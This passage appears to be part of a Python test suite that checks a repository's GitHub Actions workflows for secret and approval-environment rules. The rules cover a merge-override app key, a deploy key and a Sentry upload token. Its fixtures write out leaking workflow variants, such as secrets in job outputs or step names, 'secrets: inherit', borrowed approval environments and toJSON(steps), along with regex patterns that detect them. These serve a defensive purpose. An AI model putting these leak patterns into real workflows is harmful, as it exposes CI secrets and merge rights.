            "the outputs of a job": lambda w: w["jobs"]["smoke"].setdefault("outputs", {}).update(leak="${{ format('{0}', secrets.OTHER) }}"),
            "the steps of the images job without its environment": lambda w: (w["jobs"]["images"].pop("environment"), add_step(w, "images", run="true", env={"LEAK": "${{ secrets.OTHER }}"})),
            "a reusable workflow with its secrets": lambda w: w["jobs"].update(call={"uses": "./.github/workflows/x.yml", "secrets": {"OTHER": "${{ secrets.OTHER }}"}}),
            "the name of a step": lambda w: add_step(w, "smoke", name="${{ secrets.OTHER }}", run="true"),
            "a key": lambda w: add_step(w, "smoke", run="true", env={"${{ secrets.OTHER }}": "x"}),
        }
        for place, change in places.items():
            with self.subTest(place):
                found = secret_violations(variant(change))
                self.assertNotEqual([], found)
                self.assertTrue(all("jobs/" in f or f.startswith("jobs") for f in found), found)

    def test_secrets_inherit_is_refused_everywhere(self):
        calls = ({"uses": "./.github/workflows/x.yml", "secrets": "inherit"},
                 {"uses": "./.github/workflows/x.yml", "secrets": " Inherit "},
                 {"uses": "./.github/workflows/x.yml", "environment": "production", "secrets": "inherit"})
        for call in calls:
            found = secret_violations(variant(lambda w: w["jobs"].update(call=call)))
            self.assertIn("jobs/call/secrets: secrets: inherit passes every secret on", found, call)

    def test_secrets_inherit_at_the_workflow_level_is_refused(self):
        self.assertIn("secrets: secrets: inherit passes every secret on", secret_violations(variant(lambda w: w.update(secrets="inherit"))))

    def test_a_secret_declared_for_a_reusable_workflow_is_not_a_use(self):
        declared = {"workflow_call": {"secrets": {"TOKEN": {"required": True}}}}
        self.assertEqual([], secret_violations(variant(lambda w: w["on"].update(declared))))


def environment_problems(workflows):
    """The jobs of all workflows ({file name: parsed workflow}) whose environment is not a known literal name, or is one
    that waits for an approval in another job than the one of APPROVAL_JOBS."""
    found = []
    for file, parsed in sorted(workflows.items()):
        jobs_of = parsed.get("jobs") if isinstance(parsed.get("jobs"), dict) else {}
        for name, job in jobs_of.items():
            if not isinstance(job, dict) or "environment" not in job:
                continue
            environment = environment_name(job)
            if not isinstance(environment, str) or environment not in MAIN_ONLY_ENVIRONMENTS:
                found.append(f"{file}: {name}: the environment {environment!r} is not one of {MAIN_ONLY_ENVIRONMENTS}")
            elif environment in APPROVAL_JOBS and (file, name) != APPROVAL_JOBS[environment]:
                found.append(f"{file}: {name}: the environment {environment} belongs to the job {APPROVAL_JOBS[environment][1]} of {APPROVAL_JOBS[environment][0]} only")
    return found


class ApprovalEnvironments(unittest.TestCase):
    """An environment that waits for the user is used by one job of the whole repository, so an approval always releases
    the same, reviewed steps: a new workflow cannot ask for the same approval and get the deploy key or the key of the merge
    app (docs/features/agent-security/spec.md, R5 and R8)."""

    def setUp(self):
        self.workflows = {path.name[: -len(".json")]: json.loads(path.read_text()) for path in sorted((RENDER / "workflows").glob("*.json"))}

    def changed(self, change):
        copied = copy.deepcopy(self.workflows)
        change(copied)
        return copied

    def test_the_real_workflows_have_no_problems(self):
        self.assertIn("deploy.yml", self.workflows)
        self.assertIn("merge-override.yml", self.workflows)
        self.assertEqual([], environment_problems(self.workflows))

    def test_each_approval_environment_is_used_by_its_job(self):
        for environment, (file, job) in APPROVAL_JOBS.items():
            self.assertEqual(environment, environment_name(self.workflows[file]["jobs"][job]), environment)

    def test_the_ways_of_borrowing_an_approval_environment_are_refused(self):
        key = {"uses": "actions/create-github-app-token@" + "0" * 40, "with": {"private-key": "${{ secrets.MERGE_APP_PRIVATE_KEY }}", "skip-token-revoke": True}}
        for environment in APPROVAL_JOBS:
            for form in (environment, {"name": environment}, {"name": environment, "url": "https://x"}):
                borrowed = {"runs-on": "ubuntu-latest", "environment": form, "steps": [key]}
                copies = {
                    "a new workflow": lambda w, job=borrowed: w.update({"x.yml": {"name": "Merge override", "on": {"workflow_dispatch": {}}, "jobs": {"merge": job}}}),
                    "a job with the same name in another workflow": lambda w, job=borrowed: w["ci.yml"]["jobs"].update(merge=job, deploy=job),
                    "another job of the same workflow": lambda w, job=borrowed, file=APPROVAL_JOBS[environment][0]: w[file]["jobs"].update(other=job),
                }
                for weakened, change in copies.items():
                    with self.subTest(environment=environment, form=form, weakened=weakened):
                        found = environment_problems(self.changed(change))
                        self.assertTrue(any(f"the environment {environment} belongs to" in line for line in found), found)

    def test_an_environment_that_is_not_a_known_literal_is_refused(self):
        for form in ("staging", "Merge-Override", "merge-override ", "${{ vars.TARGET }}", "${{ 'merge-' }}override", {"url": "https://x"}, ["merge-override"], None):
            with self.subTest(form=form):
                found = environment_problems(self.changed(lambda w: w["ci.yml"]["jobs"].update(other={"environment": form, "steps": []})))
                self.assertTrue(any("ci.yml: other: the environment" in line and "is not one of" in line for line in found), found)

    def test_a_main_only_environment_without_an_approval_may_be_used_by_other_jobs(self):
        found = environment_problems(self.changed(lambda w: w["ci.yml"]["jobs"].update(other={"environment": "sentry", "steps": []})))
        self.assertEqual([], found)


# The context `steps` of an expression, the way SECRETS_CONTEXT finds `secrets`: `steps.app.outputs.token`,
# `steps.app.outputs['token']`, `toJSON(steps)` and `toJSON(steps.app.outputs)` all read the token of the merge app.
STEPS_CONTEXT = re.compile(r"(?<![\w.\-])steps(?![\w\-])", re.I)


def reads_a_step(text):
    return any(STEPS_CONTEXT.search(STRING_LITERAL.sub("''", expression)) for expression in expressions(text))


class MergeOverride(unittest.TestCase):
    """.github/workflows/merge-override.yml merges a pull request past the required checks (docs/features/agent-security/
    spec.md, R8). The key of the app that may bypass the ruleset is read in one step of the job that waits for the user in
    the environment `merge-override`; nothing of the pull request and nothing typed into the form is ever run."""

    KEY = "${{ secrets.MERGE_APP_PRIVATE_KEY }}"

    def setUp(self):
        self.workflow = json.loads((RENDER / "workflows" / "merge-override.yml.json").read_text())
        self.jobs = self.workflow["jobs"]

    def changed(self, change):
        copied = copy.deepcopy(self.workflow)
        change(copied)
        return copied

    def problems(self, workflow):
        """What breaks the properties below in a copy of the workflow (the checks the fixtures must fail)."""
        found = list(secret_violations(workflow))
        if set(workflow.get("on") or {}) != {"workflow_dispatch"}:
            found.append("another trigger than workflow_dispatch")
        jobs_of = workflow.get("jobs", {})
        if environment_name(jobs_of.get("merge", {})) != "merge-override":
            found.append("the job merge is not in the environment merge-override")
        if jobs_of.get("merge", {}).get("needs") not in ("validate", ["validate"]):
            found.append("the job merge does not need validate")
        # A job without `permissions` gets those of the workflow, a job with them only its own: both must be read-only.
        tokens = [("the workflow", workflow.get("permissions"))] + [(name, job.get("permissions", {})) for name, job in jobs_of.items()]
        for owner, permissions in tokens:
            if not isinstance(permissions, dict):
                found.append(f"{owner}: the token has the permissions {permissions!r}")
                continue
            found += [f"{owner}: the token has {scope}: {level}" for scope, level in permissions.items() if level != "read"]
        for name, job in jobs_of.items():
            if name != "merge" and "environment" in job:
                found.append(f"{name}: an environment outside the job merge")
            for step in job.get("steps", []):
                label = f"{name}: {step.get('name', step.get('uses'))}"
                if "${{" in step.get("run", ""):
                    found.append(f"{label}: an expression inside a script")
                if "uses" in step and not SHA_PIN.match(step["uses"]):
                    found.append(f"{label}: an action that is not pinned by its commit")
                if uses(step, "actions/checkout") and (set(step.get("with", {})) - {"persist-credentials"} or step.get("with", {}).get("persist-credentials") is not False):
                    found.append(f"{label}: a checkout of another ref or one that keeps the credentials")
        readers = [path for path, text in strings(workflow) if reads_a_secret(text)]
        if readers != [("jobs", "merge", "steps", self.token_step_index(workflow), "with", "private-key")]:
            found.append(f"a secret is read at {readers}")
        # The token of the app is an output of a step: the one expression of the workflow that reads the context `steps`
        # is the variable MERGE_TOKEN of the step that runs the merge script.
        outputs = [(path, text) for path, text in strings(workflow) if reads_a_step(text)]
        merge_steps = jobs_of.get("merge", {}).get("steps", [])
        script = next((i for i, step in enumerate(merge_steps) if "merge-override.sh merge" in step.get("run", "")), None)
        token_step = merge_steps[self.token_step_index(workflow)] if self.token_step_index(workflow) is not None else {}
        if outputs != [(("jobs", "merge", "steps", script, "env", "MERGE_TOKEN"), "${{ steps.%s.outputs.token }}" % token_step.get("id"))]:
            found.append(f"an output of a step is read at {[path for path, _ in outputs]}")
        if set(token_step.get("with", {})) != {"client-id", "private-key"}:
            found.append("the step that makes the token has other inputs than client-id and private-key")
        return found

    @staticmethod
    def token_step_index(workflow):
        steps_of = workflow.get("jobs", {}).get("merge", {}).get("steps", [])
        return next((i for i, step in enumerate(steps_of) if uses(step, "actions/create-github-app-token")), None)

    def test_the_real_workflow_has_no_problems(self):
        self.assertEqual([], self.problems(self.workflow))

    def test_it_starts_only_by_hand_with_the_three_inputs(self):
        self.assertEqual({"workflow_dispatch"}, set(self.workflow["on"]))
        inputs = self.workflow["on"]["workflow_dispatch"]["inputs"]
        self.assertEqual({"pr", "sha", "reason"}, set(inputs))
        for name, definition in inputs.items():
            self.assertIs(True, definition["required"], name)

    def test_only_the_job_merge_waits_in_the_environment(self):
        self.assertEqual("merge-override", environment_name(self.jobs["merge"]))
        self.assertNotIn("environment", self.jobs["validate"])
        self.assertEqual(["validate", "merge"], list(self.jobs))
        self.assertIn("merge-override", MAIN_ONLY_ENVIRONMENTS)
        self.assertIn("merge-override", APPROVAL_ENVIRONMENTS)

    def test_the_key_of_the_app_is_read_only_by_the_step_that_makes_its_token(self):
        step = self.jobs["merge"]["steps"][self.token_step_index(self.workflow)]
        self.assertEqual(self.KEY, step["with"]["private-key"])
        self.assertEqual("${{ vars.MERGE_APP_CLIENT_ID }}", step["with"]["client-id"])
        # The token is for this repository only (the default of the action without `owner` and `repositories`).
        self.assertEqual({"client-id", "private-key"}, set(step["with"]))

    def test_the_token_of_the_app_goes_only_to_the_merge_script(self):
        token = "${{ steps.%s.outputs.token }}" % self.jobs["merge"]["steps"][self.token_step_index(self.workflow)]["id"]
        places = [path for path, text in strings(self.workflow) if "outputs.token" in text]
        self.assertEqual(1, len(places), places)
        step = self.jobs["merge"]["steps"][places[0][3]]
        self.assertEqual(token, step["env"]["MERGE_TOKEN"])
        self.assertEqual("sh .github/scripts/merge-override.sh merge", step["run"].strip())
        self.assertEqual("${{ secrets.GITHUB_TOKEN }}", step["env"]["GH_TOKEN"])

    def test_the_inputs_reach_the_script_through_env(self):
        for job, mode in (("validate", "validate"), ("merge", "merge")):
            step = next(s for s in self.jobs[job]["steps"] if "merge-override.sh" in s.get("run", ""))
            self.assertEqual(f"sh .github/scripts/merge-override.sh {mode}", step["run"].strip())
            self.assertEqual("${{ inputs.pr }}", step["env"]["PR"])
            self.assertEqual("${{ inputs.sha }}", step["env"]["SHA"])
            self.assertEqual("${{ inputs.reason }}", step["env"]["REASON"])
        for job in self.jobs.values():
            for step in job["steps"]:
                self.assertNotIn("${{", step.get("run", ""), step.get("name"))

    def test_no_run_cancels_or_holds_another(self):
        # Without a concurrency group a run that waits for the approval neither blocks nor cancels a newer request for the
        # same pull request; every run is pinned to its commit, so approving a stale one merges nothing else.
        self.assertNotIn("concurrency", self.workflow)
        for name, job in self.jobs.items():
            self.assertNotIn("concurrency", job, name)

    def test_the_title_of_the_run_names_the_pull_request_and_the_commit(self):
        # The title is what the list of runs, the notification and the approval request show.
        self.assertEqual("Merge override of #${{ inputs.pr }} at ${{ inputs.sha }}", self.workflow["run-name"])

    def test_every_run_step_has_pipefail(self):
        self.assertEqual("bash", self.workflow["defaults"]["run"]["shell"])

    def test_the_weakened_copies_are_refused(self):
        # (what is weakened, the change, a text of the expected problem)
        key = self.KEY
        copies = {
            "merge without its environment": (lambda w: w["jobs"]["merge"].pop("environment"), "environment"),
            "merge in another environment": (lambda w: w["jobs"]["merge"].update(environment="production"), "not in the environment merge-override"),
            "merge in an unknown environment": (lambda w: w["jobs"]["merge"].update(environment="staging"), "a secret in a job whose environment is 'staging'"),
            "merge without validate": (lambda w: w["jobs"]["merge"].pop("needs"), "does not need validate"),
            "the key in validate": (lambda w: w["jobs"]["validate"]["steps"].append({"run": "true", "env": {"KEY": key}}), "jobs/validate"),
            "the key in the env of the workflow": (lambda w: w.update(env={"KEY": key}), "a secret at the level of the workflow"),
            "the key in a second step of merge": (lambda w: w["jobs"]["merge"]["steps"].append({"run": "true", "env": {"KEY": key}}), "a secret is read at"),
            "the key in a new job with the environment": (lambda w: w["jobs"].update(other={"environment": "merge-override", "steps": [{"run": "true", "env": {"KEY": key}}]}), "an environment outside the job merge"),
            "a pull request trigger": (lambda w: w["on"].update(pull_request={}), "another trigger"),
            "a pull_request_target trigger": (lambda w: w["on"].update(pull_request_target={}), "another trigger"),
            "a push trigger": (lambda w: w["on"].update(push={"branches": ["main"]}), "another trigger"),
            "a schedule": (lambda w: w["on"].update(schedule=[{"cron": "0 0 * * *"}]), "another trigger"),
            "an input inside a script": (lambda w: w["jobs"]["validate"]["steps"].append({"run": "echo ${{ inputs.reason }}"}), "an expression inside a script"),
            "the checkout of the pull request": (lambda w: w["jobs"]["merge"]["steps"][0].update({"with": {"persist-credentials": False, "ref": "${{ inputs.sha }}"}}), "a checkout of another ref"),
            "a checkout that keeps the credentials": (lambda w: w["jobs"]["merge"]["steps"][0].pop("with"), "keeps the credentials"),
            "an action by its tag": (lambda w: w["jobs"]["merge"]["steps"][1].update(uses="actions/create-github-app-token@v3"), "not pinned"),
            "the token of the app in another step": (lambda w: w["jobs"]["merge"]["steps"].append({"run": "true", "env": {"T": "${{ steps.app.outputs['token'] }}"}}), "an output of a step is read at"),
            "every output of the steps": (lambda w: w["jobs"]["merge"]["steps"].append({"uses": "actions/x@" + "0" * 40, "with": {"x": "${{ toJSON(steps) }}"}}), "an output of a step is read at"),
            "the token of the app as an output of the job": (lambda w: w["jobs"]["merge"].update(outputs={"t": "${{ STEPS.app.outputs.token }}"}), "an output of a step is read at"),
            "a token that is not revoked": (lambda w: w["jobs"]["merge"]["steps"][1]["with"].update({"skip-token-revoke": True}), "other inputs than client-id and private-key"),
            "a token for other repositories": (lambda w: w["jobs"]["merge"]["steps"][1]["with"].update(owner="piotrp321"), "other inputs than client-id and private-key"),
            "a job token that can write": (lambda w: w["jobs"]["merge"]["permissions"].update(contents="write"), "contents: write"),
            "a workflow token that can write": (lambda w: w["permissions"].update({"pull-requests": "write"}), "pull-requests: write"),
            "a workflow token with every permission": (lambda w: w.update(permissions="write-all"), "'write-all'"),
            "a workflow without permissions": (lambda w: w.pop("permissions"), "the workflow: the token has the permissions None"),
            "a job token with every permission": (lambda w: w["jobs"]["validate"].update(permissions="write-all"), "'write-all'"),
        }
        for weakened, (change, expected) in copies.items():
            with self.subTest(weakened):
                found = self.problems(self.changed(change))
                self.assertTrue(any(expected in line for line in found), f"{expected!r} not in {found}")


# Any way of reading the secret: `secrets.SENTRY_AUTH_TOKEN`, `secrets['SENTRY_AUTH_TOKEN']`, `secrets["SENTRY_AUTH_TOKEN"]`.
# The steps are searched as JSON text, where a double quote is written as backslash and quote, hence the optional backslash.
TOKEN_EXPRESSION = re.compile(r"""secrets(?:\.|\[\s*\\?['"])SENTRY_AUTH_TOKEN(?:\\?['"]\s*\])?""")
# The only forms in which the value of the secret may be read: a comparison with the empty string (a boolean, never the
# value) and, in the build steps of the job images, the secret input of the build.
TOKEN_PRESENCE = "${{ secrets.SENTRY_AUTH_TOKEN != '' }}"
SENTRY_BUILDS = {"build-store": "SENTRY_PROJECT_STORE", "build-admin": "SENTRY_PROJECT_ADMIN"}


def stage(dockerfile, name):
    """The text of one stage of a Dockerfile (from its FROM line to the next one)."""
    text = (REPO / dockerfile).read_text()
    parts = re.split(r"(?m)^(?=FROM )", text)
    return next(part for part in parts if re.match(rf"FROM \S+ AS {name}\b", part))


class SentrySourceMaps(unittest.TestCase):
    """Source maps of the store and the admin (docs/features/sentry/spec.md, P3, D10, threat model paths 7 and 8): the
    token of the upload exists only as a build secret of the two builds in the job images, and the maps never stay in
    the images."""

    def sentry_builds(self):
        return {step["id"]: step for step in steps("images") if step.get("id") in SENTRY_BUILDS}

    def test_the_token_is_a_secret_input_of_the_two_builds_in_the_images_job_and_nowhere_else(self):
        for name, job in jobs.items():
            for step in job["steps"]:
                text = json.dumps(step)
                for match in TOKEN_EXPRESSION.finditer(text):
                    rest = text[match.end():match.end() + 12]
                    where = f"{name}: {step.get('name')}"
                    comparison = rest.startswith(" != ''") or rest.startswith(" == ''")
                    own_secret_input = (
                        name == "images"
                        and step.get("id") in SENTRY_BUILDS
                        and TOKEN_EXPRESSION.search(step["with"].get("secrets", ""))
                        and len(TOKEN_EXPRESSION.findall(text)) == 1
                    )
                    self.assertTrue(comparison or own_secret_input, where)
        # Nothing else of the workflow reads the secret: not the workflow env, not the job envs, not a script.
        self.assertNotIn("SENTRY_AUTH_TOKEN", json.dumps({k: v for k, v in workflow.items() if k != "jobs"}))
        for name, job in jobs.items():
            self.assertNotIn("SENTRY_AUTH_TOKEN", json.dumps({k: v for k, v in job.items() if k != "steps"}), name)
        for script in run_scripts():
            self.assertNotRegex(script, r"\$\{\{[^}]*secrets(\.|\[\s*['\"])SENTRY")
        # No expression hands over every secret at once (toJSON(secrets) would put the token in a script or a log).
        self.assertNotRegex(json.dumps(workflow), r"(?i)tojson\(\s*secrets\s*\)")

    def test_the_token_is_never_a_build_argument_or_an_environment_variable_of_a_step(self):
        for name, job in jobs.items():
            for step in job["steps"]:
                for key, value in step.get("env", {}).items():
                    self.assertNotIn("SENTRY_AUTH_TOKEN", key, f"{name}: {step.get('name')}")
                    if TOKEN_EXPRESSION.search(str(value)):
                        self.assertEqual(TOKEN_PRESENCE, value, f"{name}: {step.get('name')}: {key}")
                args = step.get("with", {}).get("build-args", "")
                self.assertNotRegex(args, r"(?i)secret|token|AUTH", f"{name}: {step.get('name')}")

    def test_the_smoke_and_deploy_jobs_and_the_smoke_builds_know_nothing_of_sentry(self):
        for name in ("smoke", "deploy"):
            self.assertNotRegex(json.dumps(jobs[name]), r"(?i)sentry", name)
        for step in steps("images"):
            if uses(step, "docker/build-push-action") and step.get("id") not in SENTRY_BUILDS:
                self.assertNotRegex(json.dumps(step), r"(?i)sentry", step.get("id"))

    def test_the_store_and_the_admin_are_built_with_the_flag_the_organisation_the_project_and_the_secret(self):
        builds = self.sentry_builds()
        self.assertEqual(sorted(SENTRY_BUILDS), sorted(builds))
        for build_id, project in SENTRY_BUILDS.items():
            args = dict(line.split("=", 1) for line in builds[build_id]["with"]["build-args"].splitlines())
            self.assertEqual("${{ steps.sentry.outputs.upload }}", args["SENTRY_UPLOAD"])
            self.assertEqual("${{ vars.SENTRY_ORG }}", args["SENTRY_ORG"])
            self.assertEqual("${{ vars.%s }}" % project, args["SENTRY_PROJECT"])
            self.assertEqual({"SENTRY_UPLOAD", "SENTRY_ORG", "SENTRY_PROJECT"}, set(args))
            # An empty value is no valid secret for the build action, so the input is empty unless the upload is on.
            self.assertEqual(
                "${{ steps.sentry.outputs.upload == 'true' && format('sentry_auth_token={0}', secrets.SENTRY_AUTH_TOKEN) || '' }}",
                builds[build_id]["with"]["secrets"],
            )

    def test_the_flag_is_true_only_when_the_secret_is_set_and_the_summary_says_when_the_upload_is_skipped(self):
        step = next(s for s in steps("images") if s.get("id") == "sentry")
        self.assertEqual(TOKEN_PRESENCE, step["env"]["HAS_TOKEN"])
        self.assertEqual("${{ vars.SENTRY_ORG }}", step["env"]["SENTRY_ORG"])
        script = step["run"]
        self.assertIn('echo "upload=true" >> "$GITHUB_OUTPUT"', script)
        self.assertIn('echo "upload=false" >> "$GITHUB_OUTPUT"', script)
        self.assertIn("upload skipped", script)
        # The note is written before the builds, and a build is skipped for an image that exists: it says that the upload
        # is on, not that the maps were sent.
        self.assertIn("upload enabled", script)
        self.assertIn("is not rebuilt, so its maps are not uploaded again", script)
        self.assertNotRegex(script, r"(?i)\buploaded to sentry\b")
        self.assertIn("GITHUB_STEP_SUMMARY", script)
        # The secret is set but the organisation or a project is not: the build must not go on to an upload that fails late.
        self.assertIn("::error::", script)
        names = [s.get("name") for s in steps("images")]
        self.assertLess(names.index(step["name"]), names.index("Build and push store"))
        self.assertLess(names.index(step["name"]), names.index("Build and push admin"))

    def test_the_images_job_alone_may_see_the_secret_on_a_deployment_only(self):
        self.assertEqual(ON_MAIN, jobs["images"]["if"])
        for event, ref, expected in EVENTS:
            self.assertIs(expected, evaluate(jobs["images"]["if"], event, ref))

    def test_the_admin_config_is_a_trigger_of_the_smoke_test_like_the_one_of_the_store(self):
        paths = workflow["on"]["pull_request"]["paths"]
        self.assertIn("apps/store/next.config.ts", paths)
        self.assertIn("apps/admin/vite.config.ts", paths)

    def test_the_dockerfiles_take_the_token_from_a_secret_mount_after_the_flag(self):
        for app in ("store", "admin"):
            dockerfile = f"apps/{app}/Dockerfile"
            build = stage(dockerfile, "build")
            self.assertRegex(build, r"(?m)^ARG SENTRY_UPLOAD=false$")
            self.assertRegex(build, r"(?m)^ARG SENTRY_ORG=$")
            self.assertRegex(build, r"(?m)^ARG SENTRY_PROJECT=$")
            self.assertRegex(build, r"RUN --mount=type=secret,id=sentry_auth_token\b")
            # The arguments are declared before the RUN that builds, so they are part of its cache key.
            self.assertLess(build.index("ARG SENTRY_UPLOAD"), build.index("--mount=type=secret"))
            # The token is read from the mount, never from an argument or a layer.
            self.assertIn("/run/secrets/sentry_auth_token", build)
            text = (REPO / dockerfile).read_text()
            self.assertNotRegex(text, r"(?m)^\s*(ARG|ENV)\s+SENTRY_AUTH_TOKEN")
            for later in ("prod", "dev"):
                self.assertNotRegex(stage(dockerfile, later), r"(?i)sentry", f"{dockerfile}: {later}")

    def test_the_production_build_removes_every_map_after_the_build(self):
        for app, root in (("store", ".next"), ("admin", "dist")):
            build = stage(f"apps/{app}/Dockerfile", "build")
            self.assertRegex(build, rf"find {re.escape(root)} -name '\*\.map' -delete", app)

    def test_the_plugins_send_no_telemetry_and_fail_the_build_when_the_upload_fails(self):
        for config in ("apps/store/next.config.ts", "apps/admin/vite.config.ts"):
            text = (REPO / config).read_text()
            self.assertRegex(text, r"telemetry:\s*false", config)
            self.assertRegex(text, r"errorHandler", config)
            self.assertIn("SENTRY_UPLOAD", text, config)
            self.assertIn("SENTRY_AUTH_TOKEN", text, config)

    def test_the_builds_switch_off_the_telemetry_of_the_sentry_cli(self):
        # The plugins upload through the Sentry CLI (as a library), which has its own telemetry, on by default and not
        # affected by `telemetry: false`; only SENTRY_CLI_NO_TELEMETRY=1 turns it off, and only the build stage has it.
        for app in ("store", "admin"):
            dockerfile = f"apps/{app}/Dockerfile"
            self.assertRegex(stage(dockerfile, "build"), r"(?m)^ENV SENTRY_CLI_NO_TELEMETRY=1$", app)
            for other in ("node", "prod", "dev"):
                self.assertNotIn("SENTRY_CLI_NO_TELEMETRY", stage(dockerfile, other), f"{dockerfile}: {other}")

    def test_the_header_of_the_workflow_describes_the_source_maps(self):
        header = (REPO / ".github/workflows/deploy.yml").read_text().split("\nname: Deploy", 1)[0]
        self.assertIn("source maps", header.lower())


if __name__ == "__main__":
    unittest.main()
